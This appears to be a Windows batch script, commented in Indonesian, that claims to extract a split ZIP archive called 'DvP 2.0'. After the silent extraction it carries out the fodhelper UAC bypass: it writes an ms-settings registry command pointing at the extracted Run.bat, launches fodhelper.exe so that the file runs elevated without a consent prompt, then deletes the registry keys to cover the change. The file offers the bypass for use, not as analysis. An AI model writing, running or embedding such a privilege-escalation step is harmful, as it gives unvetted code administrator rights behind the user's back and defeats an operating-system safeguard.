@echo off
REM =============================
REM Ekstrak ZIP split DvP 2.0
REM =============================

SET "SourceFolder=%~dp0"
SET "FirstPart=DvP 2.0.zip"
SET "DestFolder=%SourceFolder%DvP 2.0 Extracted"
SET "SevenZipPath=C:\Program Files\7-Zip\7z.exe"

REM Membuat folder tujuan jika belum ada
IF NOT EXIST "%DestFolder%" (
    mkdir "%DestFolder%"
)

REM Mengecek 7-Zip
IF NOT EXIST "%SevenZipPath%" (
    echo 7-Zip tidak ditemukan. Silakan install 7-Zip.
    pause
    exit /b
)

REM Ekstraksi silent
"%SevenZipPath%" x "%SourceFolder%%FirstPart%" -o"%DestFolder%" -y >nul

REM =============================
REM Jalankan Run.bat via UAC Bypass (fodhelper)
REM =============================

SET "currentDir=%DestFolder%\"

REM Menambahkan registry untuk UAC bypass
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /ve /d "\"%currentDir%Run.bat\""
REG ADD "HKCU\Software\Classes\ms-settings\Shell\Open\command" /f /v "DelegateExecute" /d ""

REM Menjalankan fodhelper.exe untuk bypass UAC
start "" "C:\Windows\System32\fodhelper.exe"

REM Tunggu 5 detik agar Run.bat berjalan
timeout /t 5 >nul

REM Hapus registry yang dibuat
REG DELETE "HKCU\Software\Classes\ms-settings" /f >nul 2>&1
